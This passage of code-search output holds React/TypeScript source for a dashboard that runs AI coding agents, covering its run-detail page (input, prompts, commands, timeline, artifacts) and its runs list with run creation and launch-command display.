{ 'Content-Type': 'application/json' },\n        body: JSON.stringify({ input, escape: false }),\n      });\n      if (res.ok) {\n        // Add to history\n        setKeyboardHistory(prev => [...prev, keyboardInput].slice(-50));\n        setHistoryIndex(-1);\n        setKeyboardInput('');\n        addToast('success', 'Input sent');\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to send input');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to send input');\n    } finally {\n      setSendLoading(false);\n      keyboardInputRef.current?.focus();\n    }\n  };\n\n  // Handle keyboard history (up/down arrows)\n  const handleKeyDown = (e: React.KeyboardEvent) => {\n    if (e.key === 'ArrowUp') {\n      e.preventDefault();\n      const newIndex = Math.min(historyIndex + 1, keyboardHistory.length - 1);\n      if (newIndex >= 0 && keyboardHistory[keyboardHistory.length - 1 - newIndex]) {\n        setHistoryIndex(newIndex);\n        setKeyboardInput(keyboardHistory[keyboardHistory.length - 1 - newIndex]);\n      }\n    } else if (e.key === 'ArrowDown') {\n      e.preventDefault();\n      const newIndex = Math.max(historyIndex - 1, -1);\n      setHistoryIndex(newIndex);\n      if (newIndex === -1) {\n        setKeyboardInput('');\n      } else if (keyboardHistory[keyboardHistory.length - 1 - newIndex]) {\n        setKeyboardInput(keyboardHistory[keyboardHistory.length - 1 - newIndex]);\n      }", "metadata": {"file": "ui/src/pages/RunDetail.tsx", "start_line": 201, "end_line": 400, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/RunDetail.tsx", "location": "ui/src/pages/RunDetail.tsx:401", "score": 0.0, "content": "    }\n  };\n\n  // Quick response shortcuts\n  const sendQuickResponse = async (response: 'y' | 'n' | 'yes' | 'no' | 'enter') => {\n    const input = response === 'enter' ? '\\n' : response + '\\n';\n    try {\n      const res = await fetch(`/api/runs/${runId}/input`, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ input, escape: false }),\n      });\n      if (res.ok) {\n        addToast('success', `Sent: ${response}`);\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to send input');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to send input');\n    }\n    keyboardInputRef.current?.focus();\n  };\n\n  if (loading) {\n    return (\n      <div className=\"loading\">\n        <div className=\"spinner\" />\n      </div>\n    );\n  }\n\n  if (!run) {\n    return (\n      <div className=\"empty-state\">\n        <h2>Run not found</h2>\n        <Link to=\"/runs\" className=\"btn\">\n          Back to runs\n        </Link>\n      </div>\n    );\n  }\n\n  const displayTitle = run.label || run.command?.slice(0, 60) || `Run ${run.id}`;\n\n  return (\n    <div className=\"run-detail\">\n      {/* Header with Action Buttons in Top Right */}\n      <div className=\"run-header\">\n        <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: '16px', marginBottom: '12px' }}>\n          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>\n            <Link to=\"/runs\" className=\"btn btn-sm\">\n              \u2190 Back\n            </Link>\n            <StatusPill status={run.status as any} />\n            <ConnectionIndicator connected={connected} reconnecting={reconnecting} />\n          </div>\n\n          {/* Action Buttons - Top Right */}\n          {canOperate && (isActive || canDelete) && !isMobile && (\n            <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap', justifyContent: 'flex-end' }}>\n              {isActive && (\n                <>\n                  <button\n                    className=\"btn btn-sm\"\n                    onClick={() => setShowStopConfirm(true)}\n                    style={{ background: 'var(--accent-red)', color: 'white' }}\n                    title=\"Stop the running process\"\n                  >\n                    \u23f9 Stop\n                  </button>\n                  <button\n                    className=\"btn btn-sm btn-primary\"\n                    onClick={() => setShowPromptModal(true)}\n                    title=\"Send a prompt to the process\"\n                  >\n                    \ud83d\udcac Send Prompt\n                  </button>\n                  <button\n                    className=\"btn btn-sm btn-primary\"\n                    onClick={() => setShowCommandModal(true)}\n                    title=\"Run a command\"\n                  >\n                    \u25b6 Command\n                  </button>\n                </>\n              )}\n              {canDelete && (\n                <button\n                  className=\"btn btn-sm\"\n                  onClick={() => setShowDeleteConfirm(true)}\n                  style={{ background: 'var(--accent-red)', color: 'white' }}\n                  title=\"Delete this run\"\n                >\n                  \ud83d\uddd1 Delete\n                </button>\n              )}\n            </div>\n          )}\n\n          {/* Mobile: Dropdown menu */}\n          {canOperate && (isActive || canDelete) && isMobile && (\n            <div style={{ position: 'relative' }}>\n              <button\n                className=\"btn btn-sm btn-primary\"\n                onClick={() => setShowActionMenu(!showActionMenu)}\n                title=\"Action menu\"\n              >\n                \u22ee\n              </button>\n              {showActionMenu && (\n                <div\n                  style={{\n                    position: 'absolute',\n                    top: '100%',\n                    right: 0,\n                    background: 'var(--bg-secondary)',\n                    border: '1px solid var(--border-color)',\n                    borderRadius: '6px',\n                    minWidth: '140px',\n                    zIndex: 1000,\n                    boxShadow: '0 4px 12px rgba(0, 0, 0, 0.15)',\n                    marginTop: '4px',\n                  }}\n                >\n                  {isActive && (\n                    <>\n                      <button\n                        onClick={() => {\n                          setShowStopConfirm(true);\n                          setShowActionMenu(false);\n                        }}\n                        style={{\n                          display: 'block',\n                          width: '100%',\n                          padding: '10px 12px',\n                          background: 'none',\n                          border: 'none',\n                          cursor: 'pointer',\n                          textAlign: 'left',\n                          color: 'var(--text-primary)',\n                          fontSize: '13px',\n                          borderBottom: '1px solid var(--border-color)',\n                        }}\n                        onMouseEnter={(e) => (e.currentTarget.style.background = 'var(--bg-tertiary)')}\n                        onMouseLeave={(e) => (e.currentTarget.style.background = 'none')}\n                      >\n                        \u23f9 Stop\n                      </button>\n                      <button\n                        onClick={() => {\n                          setShowPromptModal(true);\n                          setShowActionMenu(false);\n                        }}\n                        style={{\n                          display: 'block',\n                          width: '100%',\n                          padding: '10px 12px',\n                          background: 'none',\n                          border: 'none',\n                          cursor: 'pointer',\n                          textAlign: 'left',\n                          color: 'var(--text-primary)',\n                          fontSize: '13px',\n                          borderBottom: '1px solid var(--border-color)',\n                        }}\n                        onMouseEnter={(e) => (e.currentTarget.style.background = 'var(--bg-tertiary)')}\n                        onMouseLeave={(e) => (e.currentTarget.style.background = 'none')}\n                      >\n                        \ud83d\udcac Prompt\n                      </button>\n                      <button\n                        onClick={() => {\n                          setShowCommandModal(true);\n                          setShowActionMenu(false);\n                        }}\n                        style={{\n                          display: 'block',\n                          width: '100%',\n                          padding: '10px 12px',\n                          background: 'none',\n                          border: 'none',\n                          cursor: 'pointer',\n                          textAlign: 'left',\n                          color: 'var(--text-primary)',\n                          fontSize: '13px',\n                          borderBottom: '1px solid var(--border-color)',\n                        }}\n                        onMouseEnter={(e) => (e.currentTarget.style.background = 'var(--bg-tertiary)')}\n                        onMouseLeave={(e) => (e.currentTarget.style.background = 'none')}\n                      >\n                        \u25b6 Command\n                      </button>\n                    </>\n                  )}\n                  {canDelete && (\n                    <button\n                      onClick={() => {\n                        setShowDeleteConfirm(true);\n                        setShowActionMenu(false);", "metadata": {"file": "ui/src/pages/RunDetail.tsx", "start_line": 401, "end_line": 600, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/RunDetail.tsx", "location": "ui/src/pages/RunDetail.tsx:601", "score": 0.0, "content": "                      }}\n                      style={{\n                        display: 'block',\n                        width: '100%',\n                        padding: '10px 12px',\n                        background: 'none',\n                        border: 'none',\n                        cursor: 'pointer',\n                        textAlign: 'left',\n                        color: 'var(--accent-red)',\n                        fontSize: '13px',\n                      }}\n                      onMouseEnter={(e) => (e.currentTarget.style.background = 'var(--bg-tertiary)')}\n                      onMouseLeave={(e) => (e.currentTarget.style.background = 'none')}\n                    >\n                      \ud83d\uddd1 Delete\n                    </button>\n                  )}\n                </div>\n              )}\n            </div>\n          )}\n        </div>\n\n        <h1 style={{ fontSize: '20px', fontWeight: 600, marginBottom: '8px' }}>\n          {displayTitle}\n        </h1>\n\n        <div\n          style={{\n            display: 'flex',\n            flexWrap: 'wrap',\n            gap: '16px',\n            fontSize: '13px',\n            color: 'var(--text-secondary)',\n          }}\n        >\n          <span>\n            <strong>ID:</strong> <code>{run.id}</code>\n          </span>\n          {run.client_name && (\n            <span>\n              <strong>Client:</strong>{' '}\n              <Link to={`/clients/${run.client_id}`}>{run.client_name}</Link>\n            </span>\n          )}\n          {run.repo_name && (\n            <span>\n              <strong>Repo:</strong> {run.repo_name}\n            </span>\n          )}\n          {run.duration && (\n            <span>\n              <strong>Duration:</strong> {formatDuration(run.duration)}\n            </span>\n          )}\n        </div>\n      </div>\n\n      {/* Assist Session Banner */}\n      {run.assistUrl && (\n        <div\n          style={{\n            padding: '12px 16px',\n            background: 'rgba(59, 185, 80, 0.1)',\n            border: '1px solid var(--accent-green)',\n            borderRadius: '8px',\n            marginBottom: '16px',\n          }}\n        >\n          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>\n            <span style={{ fontSize: '16px' }}>\ud83d\udd17</span>\n            <strong style={{ color: 'var(--accent-green)' }}>Assist Session Active</strong>\n          </div>\n          <a\n            href={run.assistUrl}\n            target=\"_blank\"\n            rel=\"noopener noreferrer\"\n            style={{\n              fontFamily: 'monospace',\n              fontSize: '13px',\n              color: 'var(--accent-blue)',\n              wordBreak: 'break-all',\n            }}\n          >\n            {run.assistUrl}\n          </a>\n        </div>\n      )}\n\n      {/* Prompt Waiting Banner */}\n      {promptWaiting && (\n        <div\n          style={{\n            padding: '12px 16px',\n            background: 'rgba(163, 113, 247, 0.15)',\n            border: '1px solid var(--accent-purple)',\n            borderRadius: '8px',\n            marginBottom: '16px',\n          }}\n        >\n          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>\n            <span style={{ fontSize: '16px' }}>\ud83d\udd14</span>\n            <strong style={{ color: 'var(--accent-purple)' }}>Waiting for your input</strong>\n          </div>\n\n          {/* Quick response buttons */}\n          <div style={{ display: 'flex', gap: '8px', marginBottom: '8px' }}>\n            <button\n              className=\"btn btn-sm\"\n              onClick={() => sendQuickResponse('y')}\n              style={{ background: 'var(--accent-green)', color: 'white' }}\n            >\n              Yes (y)\n            </button>\n            <button\n              className=\"btn btn-sm\"\n              onClick={() => sendQuickResponse('n')}\n              style={{ background: 'var(--accent-red)', color: 'white' }}\n            >\n              No (n)\n            </button>\n            <button\n              className=\"btn btn-sm\"\n              onClick={() => sendQuickResponse('yes')}\n            >\n              Yes (full)\n            </button>\n            <button\n              className=\"btn btn-sm\"\n              onClick={() => sendQuickResponse('no')}\n            >\n              No (full)\n            </button>\n            <button\n              className=\"btn btn-sm\"\n              onClick={() => sendQuickResponse('enter')}\n            >\n              Enter\n            </button>\n          </div>\n\n          {/* Keyboard input */}\n          <div style={{ display: 'flex', gap: '8px' }}>\n            <input\n              ref={keyboardInputRef}\n              type=\"text\"\n              value={keyboardInput}\n              onChange={(e) => setKeyboardInput(e.target.value)}\n              onKeyDown={handleKeyDown}\n              placeholder=\"Type your response and press Enter...\"\n              className=\"form-input\"\n              style={{ flex: 1 }}\n              disabled={sendLoading}\n            />\n            <button\n              className=\"btn btn-primary\"\n              onClick={sendKeyboardInput}\n              disabled={sendLoading || !keyboardInput.trim()}\n            >\n              {sendLoading ? 'Sending...' : 'Send'}\n            </button>\n          </div>\n\n          {/* Show recent prompt text if available */}\n          {promptText && (\n            <div\n              style={{\n                marginTop: '8px',\n                padding: '8px',\n                background: 'var(--bg-tertiary)',\n                borderRadius: '4px',\n                fontSize: '12px',\n                fontFamily: 'monospace',\n                color: 'var(--text-secondary)',\n              }}\n            >\n              {promptText.slice(-200)}\n            </div>\n          )}\n        </div>\n      )}\n\n      {/* Tabs */}\n      <div className=\"tabs\">\n        <button\n          className={`tab ${activeTab === 'log' ? 'tab-active' : ''}`}\n          onClick={() => setActiveTab('log')}\n        >\n          Live Log\n        </button>\n        <button\n          className={`tab ${activeTab === 'timeline' ? 'tab-active' : ''}`}\n          onClick={() => setActiveTab('timeline')}\n        >\n          Timeline\n        </button>\n        <button\n          className={`tab ${activeTab === 'artifacts' ? 'tab-active' : ''}`}\n          onClick={() => setActiveTab('artifacts')}", "metadata": {"file": "ui/src/pages/RunDetail.tsx", "start_line": 601, "end_line": 800, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/RunDetail.tsx", "location": "ui/src/pages/RunDetail.tsx:801", "score": 0.0, "content": "        >\n          Artifacts\n          {run.artifacts.length > 0 && (\n            <span className=\"tab-badge\">{run.artifacts.length}</span>\n          )}\n        </button>\n        <button\n          className={`tab ${activeTab === 'commands' ? 'tab-active' : ''}`}\n          onClick={() => setActiveTab('commands')}\n        >\n          Commands\n          {run.commands.length > 0 && (\n            <span className=\"tab-badge\">{run.commands.length}</span>\n          )}\n        </button>\n      </div>\n\n      {/* Tab content */}\n      <div className=\"tab-content\">\n        {activeTab === 'log' && (\n          <LiveLogViewer events={events} maxHeight=\"calc(100vh - 400px)\" />\n        )}\n\n        {activeTab === 'timeline' && (\n          <TimelineView events={events} />\n        )}\n\n        {activeTab === 'artifacts' && (\n          <ArtifactsList artifacts={run.artifacts} />\n        )}\n\n        {activeTab === 'commands' && (\n          <CommandsList commands={run.commands} />\n        )}\n      </div>\n\n      {/* Prompt Modal */}\n      <Modal\n        open={showPromptModal}\n        onClose={() => setShowPromptModal(false)}\n        title=\"Send Prompt\"\n        footer={\n          <>\n            <button className=\"btn\" onClick={() => setShowPromptModal(false)}>\n              Cancel\n            </button>\n            <button\n              className=\"btn btn-primary\"\n              onClick={sendPrompt}\n              disabled={!promptInput.trim() || promptLoading}\n            >\n              {promptLoading ? 'Sending...' : 'Send Prompt'}\n            </button>\n          </>\n        }\n      >\n        <div style={{ marginBottom: '16px' }}>\n          <label className=\"form-label\">Enter Prompt or Command</label>\n          <textarea\n            value={promptInput}\n            onChange={(e) => setPromptInput(e.target.value)}\n            placeholder=\"Enter your prompt or command to send to the running process...\"\n            className=\"form-input\"\n            style={{ minHeight: '120px', fontFamily: 'monospace', fontSize: '13px' }}\n            disabled={promptLoading}\n          />\n        </div>\n      </Modal>\n\n      {/* Command Modal */}\n      <Modal\n        open={showCommandModal}\n        onClose={() => setShowCommandModal(false)}\n        title=\"Run Command\"\n        footer={\n          <>\n            <button className=\"btn\" onClick={() => setShowCommandModal(false)}>\n              Cancel\n            </button>\n            <button\n              className=\"btn btn-primary\"\n              onClick={sendCommand}\n              disabled={!selectedCommand || commandLoading}\n            >\n              {commandLoading ? 'Sending...' : 'Run Command'}\n            </button>\n          </>\n        }\n      >\n        <div style={{ marginBottom: '16px' }}>\n          <label className=\"form-label\">Select Command</label>\n          <select\n            value={selectedCommand}\n            onChange={(e) => setSelectedCommand(e.target.value)}\n            className=\"form-input\"\n            style={{ cursor: 'pointer' }}\n          >\n            <option value=\"\">Choose a command...</option>\n            {ALLOWED_COMMANDS.map((cmd) => (\n              <option key={cmd} value={cmd}>\n                {cmd}\n              </option>\n            ))}\n          </select>\n        </div>\n        {selectedCommand && (\n          <div\n            style={{\n              padding: '12px',\n              background: 'var(--bg-tertiary)',\n              borderRadius: '6px',\n              fontFamily: 'monospace',\n              fontSize: '13px',\n            }}\n          >\n            <code>{selectedCommand}</code>\n          </div>\n        )}\n      </Modal>\n\n      {/* Stop Confirmation */}\n      <ConfirmModal\n        open={showStopConfirm}\n        onClose={() => setShowStopConfirm(false)}\n        onConfirm={stopRun}\n        title=\"Stop Run\"\n        message=\"Are you sure you want to stop this run? This will send a stop signal to the running process.\"\n        confirmText=\"Stop Run\"\n        danger\n      />\n\n      {/* Delete Confirmation */}\n      <ConfirmModal\n        open={showDeleteConfirm}\n        onClose={() => setShowDeleteConfirm(false)}\n        onConfirm={deleteRun}\n        title=\"Delete Run\"\n        message=\"Are you sure you want to delete this run? This action cannot be undone. All logs, artifacts, and data associated with this run will be permanently deleted.\"\n        confirmText={deleteLoading ? 'Deleting...' : 'Delete Run'}\n        danger\n      />\n    </div>\n  );\n}\n\n// Timeline View\nfunction TimelineView({ events }: { events: LogEvent[] }) {\n  // Group events by step_id or time buckets\n  const groupedEvents: { [key: string]: LogEvent[] } = {};\n\n  events.forEach((event) => {\n    const key = event.step_id || `time-${Math.floor(event.timestamp / 60)}`;\n    if (!groupedEvents[key]) {\n      groupedEvents[key] = [];\n    }\n    groupedEvents[key].push(event);\n  });\n\n  const groups = Object.entries(groupedEvents).sort((a, b) => {\n    const aTime = a[1][0]?.timestamp || 0;\n    const bTime = b[1][0]?.timestamp || 0;\n    return aTime - bTime;\n  });\n\n  if (groups.length === 0) {\n    return (\n      <div className=\"empty-state-small\">\n        No timeline events yet.\n      </div>\n    );\n  }\n\n  return (\n    <div className=\"timeline\">\n      {groups.map(([key, groupEvents]) => {\n        const firstEvent = groupEvents[0];\n        const lastEvent = groupEvents[groupEvents.length - 1];\n        const hasErrors = groupEvents.some(e => e.type === 'stderr' || e.type === 'error');\n\n        return (\n          <TimelineGroup\n            key={key}\n            stepId={key}\n            events={groupEvents}\n            startTime={firstEvent.timestamp}\n            endTime={lastEvent.timestamp}\n            hasErrors={hasErrors}\n          />\n        );\n      })}\n    </div>\n  );\n}\n\nfunction TimelineGroup({\n  stepId: _stepId,\n  events,\n  startTime,\n  endTime: _endTime,\n  hasErrors,", "metadata": {"file": "ui/src/pages/RunDetail.tsx", "start_line": 801, "end_line": 1000, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/RunDetail.tsx", "location": "ui/src/pages/RunDetail.tsx:1001", "score": 0.0, "content": "}: {\n  stepId: string;\n  events: LogEvent[];\n  startTime: number;\n  endTime: number;\n  hasErrors: boolean;\n}) {\n  const [expanded, setExpanded] = useState(false);\n\n  return (\n    <div\n      className=\"timeline-group\"\n      style={{\n        borderLeft: `3px solid ${hasErrors ? 'var(--accent-red)' : 'var(--border-color)'}`,\n        paddingLeft: '16px',\n        marginBottom: '12px',\n      }}\n    >\n      <div\n        onClick={() => setExpanded(!expanded)}\n        style={{\n          display: 'flex',\n          alignItems: 'center',\n          gap: '8px',\n          cursor: 'pointer',\n          padding: '8px 0',\n        }}\n      >\n        <span style={{ fontSize: '12px' }}>{expanded ? '\u25bc' : '\u25b6'}</span>\n        <span style={{ fontSize: '13px', fontWeight: 500 }}>\n          {formatTime(startTime)}\n        </span>\n        <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>\n          {events.length} events\n        </span>\n        {hasErrors && (\n          <span\n            style={{\n              padding: '2px 6px',\n              fontSize: '10px',\n              background: 'rgba(248, 81, 73, 0.15)',\n              color: 'var(--accent-red)',\n              borderRadius: '4px',\n            }}\n          >\n            errors\n          </span>\n        )}\n      </div>\n\n      {expanded && (\n        <div style={{ marginTop: '8px' }}>\n          {events.slice(0, 20).map((event) => (\n            <div\n              key={event.id}\n              style={{\n                padding: '4px 8px',\n                fontSize: '12px',\n                fontFamily: 'monospace',\n                color:\n                  event.type === 'stderr'\n                    ? 'var(--accent-red)'\n                    : event.type === 'marker'\n                    ? 'var(--accent-purple)'\n                    : 'var(--text-secondary)',\n              }}\n            >\n              {event.data.slice(0, 100)}\n              {event.data.length > 100 && '...'}\n            </div>\n          ))}\n          {events.length > 20 && (\n            <div style={{ fontSize: '12px', color: 'var(--text-muted)', padding: '4px 8px' }}>\n              +{events.length - 20} more events\n            </div>\n          )}\n        </div>\n      )}\n    </div>\n  );\n}\n\n// Artifacts List\nfunction ArtifactsList({ artifacts }: { artifacts: Artifact[] }) {\n  if (artifacts.length === 0) {\n    return (\n      <div className=\"empty-state-small\">\n        No artifacts uploaded yet.\n      </div>\n    );\n  }\n\n  return (\n    <ul className=\"artifact-list\">\n      {artifacts.map((artifact) => (\n        <li key={artifact.id} className=\"artifact-item\">\n          <div>\n            <span className=\"artifact-name\">{artifact.name}</span>\n            <span className=\"artifact-meta\">\n              {artifact.type} \u2022 {formatBytes(artifact.size)} \u2022{' '}\n              {formatTime(artifact.created_at)}\n            </span>\n          </div>\n          <a\n            href={`/api/artifacts/${artifact.id}`}\n            className=\"btn btn-sm\"\n            download\n          >\n            Download\n          </a>\n        </li>\n      ))}\n    </ul>\n  );\n}\n\n// Commands List\nfunction CommandsList({ commands }: { commands: Command[] }) {\n  if (commands.length === 0) {\n    return (\n      <div className=\"empty-state-small\">\n        No commands sent yet.\n      </div>\n    );\n  }\n\n  return (\n    <div className=\"commands-list\">\n      {commands.map((cmd) => (\n        <div key={cmd.id} className=\"command-item\">\n          <div className=\"command-header\">\n            <code className=\"command-text\">{cmd.command}</code>\n            <StatusPill\n              status={cmd.status === 'completed' ? 'done' : 'pending'}\n              size=\"sm\"\n            >\n              {cmd.status}\n            </StatusPill>\n          </div>\n          <div className=\"command-meta\">\n            Queued: {formatTime(cmd.created_at)}\n            {cmd.acked_at && ` \u2022 Completed: ${formatTime(cmd.acked_at)}`}\n          </div>\n          {cmd.result && (\n            <pre className=\"command-result\">{cmd.result}</pre>\n          )}\n          {cmd.error && (\n            <pre className=\"command-error\">{cmd.error}</pre>\n          )}\n        </div>\n      ))}\n    </div>\n  );\n}\n\nexport default RunDetail;", "metadata": {"file": "ui/src/pages/RunDetail.tsx", "start_line": 1001, "end_line": 1156, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Runs.tsx", "location": "ui/src/pages/Runs.tsx:1", "score": 0.0, "content": "import { useState, useEffect, useCallback } from 'react';\nimport { useSearchParams } from 'react-router-dom';\nimport {\n  RunCard,\n  type Run,\n  FilterBar,\n  FilterSelect,\n  SearchInput,\n  type FilterOption,\n  Modal,\n  ConfirmModal,\n  useToast,\n} from '../components/ui';\n\ninterface RunsResponse {\n  runs: Run[];\n  total: number;\n  limit: number;\n  offset: number;\n  hasMore: boolean;\n}\n\ninterface Client {\n  id: string;\n  display_name: string;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nconst statusOptions: FilterOption[] = [\n  { value: 'all', label: 'All Statuses' },\n  { value: 'running', label: 'Running' },\n  { value: 'pending', label: 'Pending' },\n  { value: 'done', label: 'Done' },\n  { value: 'failed', label: 'Failed' },\n];\n\nconst workerTypeOptions: FilterOption[] = [\n  { value: 'all', label: 'All Workers' },\n  { value: 'claude', label: 'Claude' },\n  { value: 'ollama-launch', label: 'Ollama Launch' },\n  { value: 'codex', label: 'Codex' },\n  { value: 'gemini', label: 'Gemini' },\n  { value: 'rev', label: 'Rev' },\n];\n\nconst ollamaIntegrations = [\n  { value: 'claude', label: 'Claude (Anthropic)' },\n  { value: 'codex', label: 'Codex (OpenAI)' },\n  { value: 'opencode', label: 'OpenCode' },\n  { value: 'droid', label: 'Droid' },\n];\n\nconst ollamaModels = [\n  { value: 'claude-opus', label: 'Claude Opus' },\n  { value: 'claude-sonnet', label: 'Claude Sonnet' },\n  { value: 'claude-haiku', label: 'Claude Haiku' },\n  { value: 'codellama:7b', label: 'CodeLlama 7B' },\n  { value: 'codellama:13b', label: 'CodeLlama 13B' },\n  { value: 'codellama:34b', label: 'CodeLlama 34B' },\n  { value: 'deepseek-coder:6.7b', label: 'DeepSeek Coder 6.7B' },\n  { value: 'mistral:7b', label: 'Mistral 7B' },\n  { value: 'custom', label: 'Custom...' },\n];\n\nconst geminiModels = [\n  { value: 'gemini-pro', label: 'Gemini Pro' },\n  { value: 'gemini-1.5-pro', label: 'Gemini 1.5 Pro' },\n  { value: 'gemini-1.5-flash', label: 'Gemini 1.5 Flash' },\n  { value: 'custom', label: 'Custom...' },\n];\n\nexport function Runs({ user }: Props) {\n  const { addToast } = useToast();\n  const [searchParams, setSearchParams] = useSearchParams();\n\n  // State\n  const [runs, setRuns] = useState<Run[]>([]);\n  const [clients, setClients] = useState<Client[]>([]);\n  const [total, setTotal] = useState(0);\n  const [loading, setLoading] = useState(true);\n  const [loadingMore, setLoadingMore] = useState(false);\n\n  // Create run modal state\n  const [showCreateModal, setShowCreateModal] = useState(false);\n  const [createWorkerType, setCreateWorkerType] = useState('claude');\n  const [createIntegration, setCreateIntegration] = useState('claude');\n  const [createModel, setCreateModel] = useState('');\n  const [createCustomModel, setCreateCustomModel] = useState('');\n  const [createCommand, setCreateCommand] = useState('');\n  const [createAutonomous, setCreateAutonomous] = useState(true);\n  const [createLoading, setCreateLoading] = useState(false);\n\n  // Credentials display state\n  const [showCredentialsModal, setShowCredentialsModal] = useState(false);\n  const [credentials, setCredentials] = useState<{ id: string; token: string; command: string } | null>(null);\n\n  // Filters from URL\n  const status = searchParams.get('status') || 'all';\n  const clientId = searchParams.get('clientId') || '';\n  const search = searchParams.get('search') || '';\n  const waitingApproval = searchParams.get('waitingApproval') === 'true';\n  const workerType = searchParams.get('workerType') || 'all';\n\n  // Bulk actions\n  const [selectedRuns, setSelectedRuns] = useState<Set<string>>(new Set());\n  const [showStopConfirm, setShowStopConfirm] = useState(false);\n  const [actionLoading, setActionLoading] = useState(false);\n\n  const canOperate = user?.role === 'admin' || user?.role === 'operator';\n\n  // Update URL params\n  const updateFilter = useCallback((key: string, value: string) => {\n    const newParams = new URLSearchParams(searchParams);\n    if (value && value !== 'all') {\n      newParams.set(key, value);\n    } else {\n      newParams.delete(key);\n    }\n    newParams.delete('offset'); // Reset pagination on filter change\n    setSearchParams(newParams);\n  }, [searchParams, setSearchParams]);\n\n  // Fetch runs\n  const fetchRuns = useCallback(async (append = false) => {\n    const offset = append ? runs.length : 0;\n    const params = new URLSearchParams();\n\n    if (status !== 'all') params.set('status', status);\n    if (clientId) params.set('clientId', clientId);\n    if (search) params.set('search', search);\n    if (waitingApproval) params.set('waitingApproval', 'true');\n    if (workerType !== 'all') params.set('workerType', workerType);\n    params.set('limit', '20');\n    params.set('offset', String(offset));\n\n    try {\n      append ? setLoadingMore(true) : setLoading(true);\n      const res = await fetch(`/api/runs?${params}`);\n      if (res.ok) {\n        const data: RunsResponse = await res.json();\n        if (append) {\n          setRuns(prev => [...prev, ...data.runs]);\n        } else {\n          setRuns(data.runs);\n        }\n        setTotal(data.total);\n      }\n    } catch (err) {\n      console.error('Failed to fetch runs:', err);\n      addToast('error', 'Failed to load runs');\n    } finally {\n      setLoading(false);\n      setLoadingMore(false);\n    }\n  }, [status, clientId, search, waitingApproval, runs.length, addToast]);\n\n  // Fetch clients for filter dropdown\n  const fetchClients = useCallback(async () => {\n    try {\n      const res = await fetch('/api/clients?limit=100');\n      if (res.ok) {\n        const data = await res.json();\n        setClients(data.clients || []);\n      }\n    } catch (err) {\n      // Ignore\n    }\n  }, []);\n\n  // Initial fetch\n  useEffect(() => {\n    fetchRuns();\n    fetchClients();\n  }, [status, clientId, search, waitingApproval, workerType]);\n\n  // Auto-refresh\n  useEffect(() => {\n    const interval = setInterval(() => {\n      fetchRuns();\n    }, 15000);\n    return () => clearInterval(interval);\n  }, [fetchRuns]);\n\n  // Reset filters\n  const resetFilters = () => {\n    setSearchParams(new URLSearchParams());\n    setSelectedRuns(new Set());\n  };\n\n  // Check if any filters are active\n  const hasActiveFilters = status !== 'all' || !!clientId || !!search || waitingApproval || workerType !== 'all';\n\n  // Client filter options\n  const clientOptions: FilterOption[] = [\n    { value: '', label: 'All Clients' },\n    ...clients.map(c => ({ value: c.id, label: c.display_name })),\n  ];", "metadata": {"file": "ui/src/pages/Runs.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Runs.tsx", "location": "ui/src/pages/Runs.tsx:201", "score": 0.0, "content": "\n  // Create new run\n  const handleCreateRun = async () => {\n    setCreateLoading(true);\n    try {\n      let model = createModel;\n      if (model === 'custom') {\n        model = createCustomModel;\n      }\n\n      const requestBody: any = {\n        workerType: createWorkerType,\n        autonomous: createAutonomous,\n      };\n\n      if (createCommand.trim()) {\n        requestBody.command = createCommand.trim();\n      }\n\n      if (model && (createWorkerType === 'ollama-launch' || createWorkerType === 'gemini')) {\n        requestBody.model = model;\n      }\n\n      if (createWorkerType === 'ollama-launch') {\n        requestBody.integration = createIntegration;\n      }\n\n      const res = await fetch('/api/runs', {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify(requestBody),\n      });\n\n      if (res.ok) {\n        const data = await res.json();\n        addToast('success', `Run ${data.id} created`);\n\n        // Show credentials modal\n        let cmd = `ai-runner start --run-id ${data.id} --token ${data.capabilityToken}` +\n          ` --worker-type ${createWorkerType}`;\n\n        if (createWorkerType === 'ollama-launch') {\n          cmd += ` --integration ${createIntegration}`;\n        }\n\n        if (model) {\n          cmd += ` --model \"${model}\"`;\n        }\n\n        if (createCommand) {\n          cmd += ` --cmd \"${createCommand}\"`;\n        }\n\n        setCredentials({\n          id: data.id,\n          token: data.capabilityToken,\n          command: cmd\n        });\n        setShowCredentialsModal(true);\n\n        fetchRuns();\n        setShowCreateModal(false);\n        // Reset form\n        setCreateWorkerType('claude');\n        setCreateIntegration('claude');\n        setCreateModel('');\n        setCreateCustomModel('');\n        setCreateCommand('');\n        setCreateAutonomous(true);\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to create run');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to create run');\n    } finally {\n      setCreateLoading(false);\n    }\n  };\n\n  const supportsModelSelection = createWorkerType === 'ollama-launch' || createWorkerType === 'gemini';\n  const supportsIntegrationSelection = createWorkerType === 'ollama-launch';\n  const availableModels = createWorkerType === 'ollama-launch' || createWorkerType === 'gemini' ?\n                         (createWorkerType === 'gemini' ? geminiModels : ollamaModels) : [];\n\n  // Toggle run selection\n  const toggleRunSelection = (runId: string) => {\n    setSelectedRuns(prev => {\n      const next = new Set(prev);\n      if (next.has(runId)) {\n        next.delete(runId);\n      } else {\n        next.add(runId);\n      }\n      return next;\n    });\n  };\n\n  // Stop selected runs\n  const stopSelectedRuns = async () => {\n    setActionLoading(true);\n    let succeeded = 0;\n    let failed = 0;\n\n    for (const runId of selectedRuns) {\n      try {\n        const res = await fetch(`/api/runs/${runId}/stop`, { method: 